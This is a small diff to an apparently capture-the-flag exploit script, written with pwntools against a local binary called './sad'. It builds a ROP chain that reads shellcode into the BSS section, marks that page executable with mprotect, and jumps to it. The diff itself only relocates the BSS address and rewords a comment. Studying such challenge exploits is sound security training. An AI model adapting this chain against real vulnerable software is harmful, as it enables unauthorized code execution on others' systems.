@@ -3,14 +3,14 @@ from pwn import *
 context.clear(arch="amd64")
 context.log_level = "DEBUG"
 
-#BSS = 0x00000000004b0240
-BSS = 0x00000000004b0000 # Needs to be page-aligned for mprotect
-
 e = ELF("./sad")
 rop = ROP(e)
 
+#BSS = e.bss()
+BSS = 0x00000000004b0000 # Needs to be page-aligned for mprotect
+
 rop.gets(BSS) # Write shellcode to memory
-rop.mprotect(BSS, 0x100, 0x1 | 0x2 | 0x4) # Make page executable
+rop.mprotect(BSS, 0x100, 0x1 | 0x2 | 0x4) # Make memory executable
 rop.raw(BSS) # Jump to the shellcode
 
 print(rop.dump())
